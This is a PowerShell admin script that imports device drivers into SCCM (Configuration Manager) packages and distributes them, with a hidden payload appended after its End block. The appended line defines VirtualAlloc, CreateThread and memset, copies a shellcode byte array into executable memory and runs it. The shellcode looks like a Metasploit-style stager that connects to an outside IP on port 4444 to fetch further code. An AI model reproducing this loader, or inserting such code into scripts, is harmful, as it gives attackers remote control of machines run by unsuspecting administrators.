
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server name with SMS Provider installed")]
    [string]$SiteServer,
    [parameter(Mandatory=$true, HelpMessage="Path to where the Driver Source root directory is located")]
    [ValidatePattern("^\\\\\w+\\\w+")]
    [ValidateScript({Test-Path -Path $_ -PathType Container})]
    [string]$DriverSourcePath,
    [parameter(Mandatory=$true, HelpMessage="Path to where the Driver Package root directory is located")]
    [ValidatePattern("^\\\\\w+\\\w+")]
    [ValidateScript({Test-Path -Path $_ -PathType Container})]
    [string]$DriverPackagePath,
    [parameter(Mandatory=$true, HelpMessage="Specify the device model")]
    [string]$Model,
    [parameter(Mandatory=$true, HelpMessage="Specify the device manufacturer")]
    [string]$Make,
    [parameter(Mandatory=$true, HelpMessage="Specify the operating system the drivers are supported on")]
    [string]$OperatingSystem,
    [parameter(Mandatory=$false, HelpMessage="Specify the additional driver categories to be associated with the drivers for this model")]
    [string[]]$Categories,
    [parameter(Mandatory=$true, HelpMessage="Specify the name of the Distribution Point Group that new Driver Packages will be distributed to")]
    [string]$DPGroupName,
    [parameter(Mandatory=$false, HelpMessage="Show a progressbar displaying the current operation")]
    [switch]$ShowProgress
)
Begin {
    
    $CurrentLocation = Get-Location
    
    try {
        Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Debug "SiteCode: $($SiteCode)"
            }
        }
    }
    catch [Exception] {
        Throw "Unable to determine SiteCode"
    }
    
    try {
        $SiteDrive = $SiteCode + ":"
        Import-Module (Join-Path -Path (($env:SMS_ADMIN_UI_PATH).Substring(0,$env:SMS_ADMIN_UI_PATH.Length-5)) -ChildPath "\ConfigurationManager.psd1") -Force -Verbose:$false
        if ((Get-PSDrive $SiteCode -ErrorAction SilentlyContinue | Measure-Object).Count -ne 1) {
            New-PSDrive -Name $SiteCode -PSProvider "AdminUI.PS.Provider\CMSite" -Root $SiteServer
        }
    }
    catch [Exception] {
        Throw "Unable to determine SiteCode"
    }
    if ($PSBoundParameters["ShowProgress"]) {
        $CurrentDriverCount = 0
    }
}
Process {
    
    $DriverINFs = Get-ChildItem -Path $DriverSourcePath -Recurse -Include *.inf
    Set-Location $SiteDrive -Verbose:$false
    
    $DriverCategories = New-Object -TypeName System.Collections.ArrayList
    $DriverCategories.AddRange(@($Model, $Make, $OperatingSystem))
    if ($PSBoundParameters["Categories"]) {
        $DriverCategories.AddRange(@($Categories))
    }
    foreach ($DriverCategory in $DriverCategories) {
        if ((Get-CMCategory -CategoryType DriverCategories -Name $DriverCategory -Verbose:$false) -eq $null) {
            Write-Verbose -Message "Creating new Driver Category: $($DriverCategory)"
            New-CMCategory -CategoryType DriverCategories -Name $DriverCategory -Verbose:$false | Out-Null
        }
    }
    
    $DriverPackageName = "$($Make) - $($Model) - $($OperatingSystem)"
    if ((Get-CMDriverPackage -Name $DriverPackageName -Verbose:$false) -eq $null) {
        if ($DriverPackagePath.EndsWith("\")) {
            $NewDriverPackagePath = "$($DriverPackagePath)$($OperatingSystem)\$($Make)\$($Model)"
        }
        else {
            $NewDriverPackagePath = "$($DriverPackagePath)\$($OperatingSystem)\$($Make)\$($Model)"
        }
        Write-Verbose -Message "Creating new Driver Package: $($DriverPackageName)"
        New-CMDriverPackage -Name $DriverPackageName -Path $NewDriverPackagePath -Verbose:$false | Out-Null
        if ($PSCmdlet.ShouldProcess("Package: $($DriverPackageName)","Distribute")) {
            Start-CMContentDistribution -DriverPackageName $DriverPackageName -DistributionPointGroupName $DPGroupName -Verbose:$false | Out-Null
        }
    }
    $DriverPackage = Get-CMDriverPackage -Name "$($DriverPackageName)" -Verbose:$false
    if (($DriverPackage | Measure-Object).Count -ge 1) {
        Write-Verbose -Message "Driver Package: $($DriverPackage.Name)"
    }
    
    $DriverCategoryArray = @()
    foreach ($DriverCategoryObject in $DriverCategories) {
        $DriverCategoryArray += (Get-CMCategory -CategoryType DriverCategories -Name $DriverCategoryObject -Verbose:$false)
    }
    foreach ($CategoryObject in $DriverCategoryArray) {
        Write-Verbose -Message "Categories: $($CategoryObject.LocalizedCategoryInstanceName)"
    }
    
    $DriverCount = ($DriverINFs | Measure-Object).Count
    foreach ($DriverINF in $DriverINFs) {
        $CurrentDriverCount++
        if ($PSBoundParameters["ShowProgress"]) {
            $ProgressArguments = @{
                Id = 1
                Activity = "Importing Drivers"
                Status = "Processing driver $($CurrentDriverCount) of $($DriverCount)"
                CurrentOperation = "Current model: $($Model)"
                PercentComplete = (($CurrentDriverCount / $DriverCount) * 100)
            }
            Write-Progress @ProgressArguments
        }
        try {
            if ($PSCmdlet.ShouldProcess("Driver: $($DriverINF.Name)","Import Driver")) {
                $DriverArguments = @{
                    UncFileLocation = $DriverINF.FullName
                    DriverPackage = $DriverPackage
                    EnableAndAllowInstall = $true
                    AdministrativeCategory = $DriverCategoryArray
                    ImportDuplicateDriverOption = "AppendCategory"
                    ErrorAction = "SilentlyContinue"
                    Verbose = $false
                }
                Import-CMDriver @DriverArguments | Out-Null
            }
        }
        catch {
            Write-Warning "Failed to import: $($DriverINF.FullName). $($_.Exception.Message)"
        }
    }
    if ($PSBoundParameters["ShowProgress"]) {
        Write-Progress -Id 1 -Activity "Importing Drivers" -Completed
    }
    if ($PSCmdlet.ShouldProcess("Package: $($DriverPackageName)","Update")) {
        Update-CMDistributionPoint -DriverPackageName $DriverPackageName -Verbose:$false
    }
}
End {
    Set-Location $CurrentLocation -Verbose:$false
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x51,0x32,0xd5,0x8a,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

